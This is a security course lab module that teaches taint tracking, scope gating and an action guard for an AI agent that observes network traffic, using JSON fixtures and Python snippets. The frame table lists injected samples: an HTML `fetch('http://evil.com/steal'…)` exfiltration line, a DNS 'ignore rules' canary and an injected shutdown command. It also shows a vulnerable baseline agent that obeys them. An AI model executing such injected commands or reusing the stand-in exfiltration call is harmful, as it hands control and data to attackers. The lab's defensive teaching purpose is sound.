# Module 9: InterceptBound — Traffic Interception & Taint Tracking

**Duration**: 1.5 hours | **Difficulty**: ⭐⭐⭐ | **Prerequisites**: Modules 4, 6 (provenance, injection)
**Demo directory**: `demo-09-interceptbound/`

---

## 🎯 Learning Objectives

By the end of this module, you will be able to:

1. **Model** intercepted traffic as typed frames (HTTP/DNS/TLS/custom) with per-frame provenance and taint levels
2. **Propagate** taint from frames through a parser to every extracted field, including nested structures
3. **Operate** an ephemeral buffer with TTL and secure deletion for credential-like intercepted values
4. **Enforce** a downstream action guard that blocks high-taint data from sensitive operations (credential storage, system commands)
5. **Distinguish** scope blocking (source not allowed) from taint blocking (data too dirty) — two different gates for two different questions

---

## 📖 Background: The Listener's Dilemma

An agent positioned to observe traffic (monitoring, relay, diagnostics) sees *everything* — including forgeries. Two attackers are in scope:

1. **The endpoint** — a compromised server sends poisoned responses (fake tokens, injected commands)
2. **The path** — a man-in-the-middle forges frames wholesale

The defense is a **taint lattice** attached to every datum, plus an **action guard** that asks, before any sensitive operation: *how dirty is the input?*

```
  TAINT LATTICE                    ACTION GUARD
┌────────────────────┐      ┌─────────────────────────────────┐
│ LOW    trusted     │      │ authorize(action, taint):       │
│ MEDIUM  clean wire │ ───► │   taint > max_taint?  → BLOCK   │
│ HIGH   suspicious  │      │   intercepted + not LOW? → BLOCK│
└────────────────────┘      │   else                → ALLOW   │
                            └─────────────────────────────────┘
```

And a *third* gate upstream of everything: **scope**. Frames from sources outside the allowed list never even get parsed. Keep the three questions straight — this module's most common confusion is blending them:

| Gate | Question | Fails when… |
|------|----------|-------------|
| **Scope** | May I listen to this source at all? | Source IP not allowlisted |
| **Taint** | Is this *datum* clean enough for this *action*? | Field's taint exceeds the action's allowance |
| **Provenance** | Where did this come from? | (Label attached always; enforced via taint rules) |

Plus the **ephemeral buffer**: anything credential-like that *was* parsed lives only briefly (TTL) and is securely overwritten on deletion — because even defended pipelines hold transient secrets.

**Safety framing**: all frames are JSON fixtures. No sockets, no ARP, no capture. The demo simulates the *decision layer* only. `make verify-safety` holds.

### The six frames

| Frame | Proto | Source | Taint | Payload of interest |
|-------|-------|--------|-------|---------------------|
| frame_001 | HTTP | .10 | HIGH | JSON body with `token` (credential-like) |
| frame_002 | HTTP | .10 | HIGH | HTML with `fetch('http://evil.com/steal'…)` injection |
| frame_003 | DNS | .1 | HIGH | TXT record: `CANARY_DNS_INJECTION_IGNORE_RULES` |
| frame_004 | TLS | .20 | MEDIUM | clean handshake metadata |
| frame_005 | custom | .30 | HIGH | stream with `{"command": "shutdown"}` injection |
| frame_006 | HTTP | .10 | MEDIUM | clean 401 response |

---

## 🛠️ Part 1: Frames and Parsing

### Step 1: Read the fixture and predict

```bash
cat demo-09-interceptbound/fixtures/traffic.json
```

**What this does**: Prints the six frames, the scope policy (`allowed_sources` includes .10/.20/.30/.1; max taint for action = `low`), and the buffer config (size 1000, TTL 60s, secure delete on).

**Why it matters**: Note the policy tension you'll spend the module exploring: **max_taint_for_action is `low`**, yet *every* frame carries `intercepted_network` provenance with taint ≥ MEDIUM. Prediction table (fill before running):

| Frame | In scope? | Parsed fields | Sensitive action attempted? | Guard verdict |
|-------|-----------|---------------|------------------------------|---------------|
| frame_001 (token) | ? | ? | store_token | ? |
| frame_003 (DNS TXT) | ? | ? | — | ? |
| frame_004 (TLS) | ? | ? | — | ? |
| frame_005 (shutdown) | ? | ? | execute_shutdown | ? |

Key prediction: with `max=LOW`, *any* intercepted credential-like value must be blocked from storage — even though "observing" it was fine. Observing ≠ retaining ≠ acting. Three different privilege levels for three different operations.

---

### Step 2: Parse one frame and inspect taint propagation

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import json, sys
from pathlib import Path
sys.path.insert(0, "student")
from interceptbound import TaintTracker, TrafficFrame, Provenance, TaintLevel

raw = next(f for f in json.loads(Path("fixtures/traffic.json").read_text())["traffic_frames"]
           if f["id"] == "frame_001")
frame = TrafficFrame(raw["id"], raw["protocol"], raw["src"], raw["dst"], raw["direction"],
                     raw["fields"], Provenance(raw["provenance"]), TaintLevel(raw["taint"]),
                     raw["injection"])

for p in TaintTracker().parse_frame(frame):
    print(f"{p.name:28} taint={p.taint.value:6} prov={p.provenance.value}  val={str(p.value)[:40]}")
EOF
cd ../..
```

**What this does**: Parses frame_001 and prints each extracted field with its taint and provenance.

**Why it matters**: Expected:
```
status                    taint=high   prov=intercepted_network  val=200
headers.Content-Type      taint=high   prov=intercepted_network  val=application/json
headers.Server            taint=high   prov=intercepted_network  val=nginx/1.18
body                      taint=high   prov=intercepted_network  val={"user": "alice", …token…}
```

Two properties to record:
1. **Taint is frame-wide**: every field extracted from a HIGH frame is HIGH — including the innocuous `status: 200`. Taint is conservative; refinement (downgrading `status`) is possible in richer systems but must be *justified*, never default.
2. **Nesting flattens with dotted names**: `headers.Content-Type` — the parser recurses dicts and lists (`answers[0].value` style) so every leaf is individually labeled. Unlabeled leaves are the classic taint-tracking hole.

---

## 🤖 Part 2: The Unguarded Baseline

### Step 3: Run the baseline agent

```bash
cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/Unguarded Baseline/,/^$/p' && cd ../..
```

**What this does**: Runs the demo's baseline section — no taint, no scope, string-matching triggers.

**Why it matters**: The baseline executes `store_token` on frame_001 (storing an attacker-forgeable credential) and `execute_shutdown` on frame_005 (an injected command). Both actions derive entirely from intercepted bytes. This is the Module 6 vulnerable agent again, but with *state* consequences: a poisoned token in a credential store outlives the session that injected it.

---

## 🛡️ Part 3: The Taint-Aware Agent

### Step 4: Run the defended agent

```bash
cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/Taint-Aware/,/^$/p' && cd ../..
```

**What this does**: Runs the defended section: scope check → taint-aware parse → buffer storage → guard-gated actions.

**Why it matters** — expected highlights:

```
frame_001: BLOCKED store_token   (taint_too_high: high > low)
frame_005: BLOCKED execute_shutdown (taint_too_high: high > low)
frame_002/003: BLOCKED process_injection (injection_detected)
frame_004: parsed, observed, no sensitive action attempted
```

Cross-reference with your Step 1 predictions. Then record the *reasons* — the guard distinguishes:
- `taint_too_high` — data too dirty for the action (frames 001, 005)
- `injection_detected` — explicit canary/command found (frames 002, 003)
- `source_not_allowed` — scope (only when you probe with a foreign source; Step 6)

Three distinct failure reasons are audit gold: they let an operator tell *which defense* fired, and tune each independently.

---

### Step 5: Probe the action guard's boundary

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import sys; sys.path.insert(0, "student")
from interceptbound import ActionGuard, TaintLevel, Provenance

g = ActionGuard(TaintLevel.LOW)
cases = [
    ("store_credential", TaintLevel.LOW,   Provenance.TRUSTED_LOCAL),
    ("store_credential", TaintLevel.MEDIUM,Provenance.INTERCEPTED_NETWORK),
    ("store_credential", TaintLevel.HIGH,  Provenance.INTERCEPTED_NETWORK),
    ("log_metric",       TaintLevel.HIGH,  Provenance.INTERCEPTED_NETWORK),
]
for action, taint, prov in cases:
    ok, why = g.authorize(action, taint, "x", prov)
    print(f"{action:18} taint={taint.value:6} -> {'ALLOW' if ok else 'BLOCK'} ({why})")

print("\n-- same guard, max=MEDIUM --")
g2 = ActionGuard(TaintLevel.MEDIUM)
for taint in TaintLevel:
    ok, why = g2.authorize("report_finding", taint, "x", Provenance.INTERCEPTED_NETWORK)
    print(f"  report taint={taint.value:6} -> {'ALLOW' if ok else 'BLOCK'} ({why})")
EOF
cd ../..
```

**What this does**: Sweeps the guard across taint levels and provenances at `max=LOW`, then re-sweeps at `max=MEDIUM`.

**Why it matters**: At `max=LOW`, only trusted-local LOW data may act; note the guard's second rule — intercepted-network data requires LOW *regardless* of the max setting, so even at `max=MEDIUM` an intercepted HIGH value is blocked. The lattice and the provenance rule compose. **Design question for your notes**: the `log_metric` case (HIGH taint, low-risk action) is *allowed* — the guard gates actions by their sensitivity, not a blanket ban. Where would you draw the line between "log it" and "store it"?

---

### Step 6: Confirm scope is a separate gate

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import sys; sys.path.insert(0, "student")
from interceptbound import TaintAwareAgent, TrafficFrame, Provenance, TaintLevel

agent = TaintAwareAgent(
    {"allowed_sources": ["192.168.1.10"], "max_taint_for_action": "low"},
    {"max_size": 10, "ttl_seconds": 60, "secure_delete": True},
)
frame = TrafficFrame("probe", "http", "10.0.0.1:80", "192.168.1.100:1", "response",
                     {"body": "shutdown"}, Provenance.INTERCEPTED_NETWORK,
                     TaintLevel.HIGH, None)
print(agent.process(frame))
EOF
cd ../..
```

**What this does**: Feeds the defended agent a frame from a *disallowed* source whose payload contains "shutdown."

**Why it matters**: Output: `{'frame': 'probe', 'actions': [], 'blocked': 'source_not_allowed'}` — a *string*, not the list-of-dicts the taint path returns. The frame never reached parsing; the shutdown string was never examined. Two lessons: (a) scope is a pre-filter that short-circuits everything, and (b) **your result schema differs per exit path** — consumers must handle both shapes. (Exercise 5 tightens this.)

---

## 🧹 Part 4: The Ephemeral Buffer

### Step 7: Exercise TTL and secure deletion

```bash
cd demo-09-interceptbound && python3 - << 'EOF'
import sys, time; sys.path.insert(0, "student")
from interceptbound import EphemeralBuffer

buf = EphemeralBuffer(max_size=10, ttl_seconds=1, secure_delete=True)
buf.add("cred", "DEMO_TOKEN_ABC123")
print("immediately:", buf.get("cred"))

buf.delete("cred")
print("after delete:", buf.get("cred"))

buf.add("expiring", "data")
time.sleep(1.1)
print("after TTL:  ", buf.get("expiring"))
EOF
cd ../..
```

**What this does**: Demonstrates all three buffer behaviors: immediate read, secure delete (value overwritten then removed), and TTL expiry.

**Why it matters**: Why does a *defended* pipeline hold intercepted credentials at all? Because parsing requires transient state. The buffer's job is to make that holding *bounded*: TTL caps lifetime, `max_size` caps volume, secure-delete scrubs on eviction. The residual risk — the secret existed in memory for up to 60s — is why the guard *also* blocks storing it anywhere durable. Defense in depth: even the allowed holding is minimized. Record in notes what `secure_delete` can and cannot guarantee in Python (hint: object copies, GC, core dumps).

---

### Step 8: Run the test suite

```bash
cd demo-09-interceptbound && python3 -m pytest tests/ -v && cd ../..
```

**What this does**: Runs all 15 tests. Key pins:

| Test | Pins |
|------|------|
| `test_taint_assignment` | Every parsed field inherits frame taint + provenance + source |
| `test_action_guard_blocks_high_taint` | The Step 5 boundary, as an assertion |
| `test_baseline_no_taint_tracking` | Baseline *does* execute shutdown (specimen preserved) |
| `test_guarded_blocks_shutdown` / `…_token_storage` | The two headline defenses |
| `test_source_scope_enforcement` | Foreign source → `source_not_allowed` (uses its own frame) |
| `test_dns_injection_detected` | TXT canary caught in the blocked list |
| `test_ephemeral_buffer_secure_delete` / `…_ttl` | Buffer semantics |

**Why it matters**: Notice `test_source_scope_enforcement` constructs its own frame rather than using a fixture — because after the fixture was widened to let the DNS server in (so its injection could be *tested*), no fixture frame remained that fails scope. When a defense and a test need conflict, the resolution is new fixtures or synthetic probes — never weakening the defense.

---

## 🎯 Part 5: Exercises

### Beginner

**Exercise 9.1 — Replay detection.**
Add a `seen_nonces` set to the agent. Before processing, extract any `nonce` from JSON-ish payloads; if a nonce repeats within the TTL window, append `{"action": "process_frame", "reason": "replay_detected"}` to blocked. Demonstrate by processing frame_005 twice.

**What this teaches**: Interception defenses aren't just about content — temporal properties (replay) need state, and the buffer is where that state lives.

### Standard

**Exercise 9.2 — Taint refinement with justification.**
Implement `refine(field) -> taint` that downgrades `status`-type fields (numeric HTTP codes, TLS versions) from their frame's taint to MEDIUM, logging each refinement with a rule id. Re-run frame_001: `status` becomes MEDIUM while `body` stays HIGH. Then answer in notes: what attack does refinement enable if your rule list is wrong? Add `test_refinement_only_for_allowlisted_fields`.

**What this teaches**: Taint *lattice* implies meet/join operations, but every downgrade is a policy claim that must be enumerated and auditable. Default-dirty, refine-with-receipts.

**Exercise 9.3 — Uniform result schema.**
Fix the Step 6 asymmetry: every `process` return becomes `{"frame", "actions": [], "blocked": [], "parsed_fields": int, "taint_tracked": bool, "exit": "ok"|"scope_blocked"}` with `blocked` always a list of dicts (`{"reason": "source_not_allowed"}`). Update the existing tests, and add `test_scope_blocked_shape`.

**What this teaches**: Security tooling is also software; inconsistent exit shapes cause downstream *consumers* to fail open (imagine a dashboard treating a string as falsy-empty). Normalize at the boundary.

### Extension

**Exercise 9.4 — Omission detection in sequences.**
Frames carry implicit sequence (frame_001…006). Implement a `SequenceWatcher` expecting contiguous per-source sequence numbers; a gap (frame dropped — perhaps *deliberately* dropped by an attacker suppressing a "revoked credential" message) raises a blocked entry `{"reason": "sequence_gap", "expected": n, "got": m}`. Test with a doctored fixture missing frame_003.

**What this teaches**: Integrity isn't only content — *absence* is an attack surface (Module 5's omission lesson, applied to streams).

**Exercise 9.5 — Credential-canary lifecycle.**
When a credential-like value (regex `token|secret|password|bearer`, case-insensitive) is parsed: (1) never buffer the real value — buffer `sha256(value)[:12]` plus a canary `CANARY_CRED_<n>`; (2) emit a blocked entry `{"action": "store_token", "reason": "credential_canary_quarantined", "fingerprint": …}`. Demonstrate that the buffer never contains `DEMO_TOKEN_ABC123` but the audit log identifies which frame carried it.

**What this teaches**: Data minimization as defense: you can *alert* on secrets without *possessing* them. The fingerprint preserves forensics; the secret never enters the pipeline.

---

## 📝 Lab Notes Questions

1. Frame_004 (TLS, MEDIUM, clean) is parsed and buffered but triggers no sensitive action; frame_001 (HTTP, HIGH) is parsed, buffered, and *blocked* from token storage. Explain exactly where the pipeline treated them differently, and why observing both was acceptable.
2. The guard has two blocking rules (taint ceiling; intercepted-requires-LOW). Construct a case where rule 2 blocks something rule 1 would allow, and explain what attack rule 2 exists for.
3. Step 7's buffer held a "credential" for up to 60 seconds by design. List the residual risks of that design and one mitigation for each (hint: memory, swaps, forks, exception paths).

---

## ✅ Completion Checklist

- [ ] Six frames read; prediction table completed *before* running
- [ ] Taint propagation inspected (frame-wide, nested flattening)
- [ ] Baseline's store_token + execute_shutdown observed
- [ ] Defended agent's three distinct block reasons recorded
- [ ] Guard boundary swept at max=LOW and max=MEDIUM; rule-2 case identified
- [ ] Scope-vs-taint separation demonstrated with a synthetic frame
- [ ] Buffer TTL + secure-delete exercised; residual-risk note written
- [ ] All 15 tests pass; the scope-test-vs-fixture conflict story noted
- [ ] At least Beginner + Exercise 9.2 (refinement) — 9.2 is essential
- [ ] `LAB_NOTES.md` Module 9 block filled (seed 42, commit, `make demo DEMO=09`)

---

**⬅️ Prev: [Module 8](lab-08-inclusiontrap.md) | ➡️ Next: [Module 10: ScanBound](lab-10-scanbound.md)**
